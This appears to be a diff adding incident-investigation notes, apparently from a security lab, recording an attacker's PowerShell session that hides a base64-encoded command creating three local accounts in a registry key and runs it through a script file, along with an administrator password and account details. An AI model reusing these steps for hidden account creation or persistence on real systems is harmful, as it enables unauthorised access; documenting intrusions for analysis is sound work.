@@ -160,13 +160,63 @@ Timestamp                        Rule                                           
 2023-08-23 11:08:50.171 -07:00	ET POLICY GIOP/IIOP Request Outbound	high	192.168.99.20	53992	172.64.0.13	445
 
 
+Administrator
+W!nd0w5P@zz!!
 
 
+‎Thursday, ‎August ‎24, ‎2023, ‏‎4:52:58 AM
+
+New-Item -Path "HKLM:\System\Setup\" -Name "LotR"
+$string = '$chars = "lurtz","mithrandir","saruman"; foreach ($char in $chars) { net user /ADD $char youshallpass }'
+
+‎Thursday, ‎August ‎24, ‎2023, ‏‎4:52:58 AM
+User with credentials for Administrator, logged into 192.168.1.7 and ran PowerShell commands to create three users with a common password. Currently, these users have yet to log into this machine. 
+
+Users Created:
+lurtz               S-1-5-21-2183018456-3128199268-2372014868-
+mithrandir          S-1-5-21-2183018456-3128199268-2372014868-1010
+saruman             S-1-5-21-2183018456-3128199268-2372014868-1011
+
+Password for Users:
+YouShallPass!!!1234
+
+Registry Key location:
+HKLM:\System\Setup\LotR
+
+.ps1 file location:
+C:\Users\Administrator\towar.ps1
+
+PowerShell commands:
+New-Item -Path "HKLM:\System\Setup\" -Name "LotR"
+$string = '$chars = "lurtz","mithrandir","saruman"; foreach ($char in $chars) { net user /ADD $char youshallpass }'
+$string
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($String))
+$encoded
+New-ItemProperty -Path "HKCU:\System\Setup\LotR" -Name "TheHourIsLate" -Value "$encoded" -PropertyType "String"
+New-ItemProperty -Path "HKLM:\System\Setup\LotR" -Name "TheHourIsLate" -Value "$encoded" -PropertyType "String"
+Get-ExecutionPolicy
+gci -Path "HKLM:\System\Setup\LotR" -Name "TheHourIsLate"
+gci -Path "HKLM:\System\Setup\LotR"
+Get-ItemProperty -Path "HKLM:\System\Setup\LotR"
+Get-ItemProperty -Path "HKLM:\System\Setup\LotR" -Name "TheHourIsLate"
+Get-ItemPropertyValue -Path "HKLM:\System\Setup\LotR" -Name "TheHourIsLate"
+Write-Host '$cmd = Get-ItemPropertyValue -Path "HKLM:\System\Setup\LotR" -Name "TheHourIsLate"; powershell.exe -EncodedCommand $cmd' > towar.ps1
+powershell.exe towar.ps1
+powershell.exe .\towar.ps1
+net user
+$cmd
+$cmd = Get-ItemPropertyValue -Path "HKLM:\System\Setup\LotR" -Name "TheHourIsLate"
+$cmd
+powershell.exe -EncodedCommand $cmd
+$string = '$chars = "lurtz","mithrandir","saruman"; foreach ($char in $chars) { net user /ADD $char YouShallPass!!!1234 }'
+$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($String))
+New-ItemProperty -Path "HKLM:\System\Setup\LotR" -Name "TheHourIsLate" -Value "$encoded" -PropertyType "String"
+$encoded
+powershell.exe -EncodedCommand $encoded
+$encoded
+exit
 
 
-
-
-
-
-
+MsMpEng.exe
+mpengine_etw.dll
 
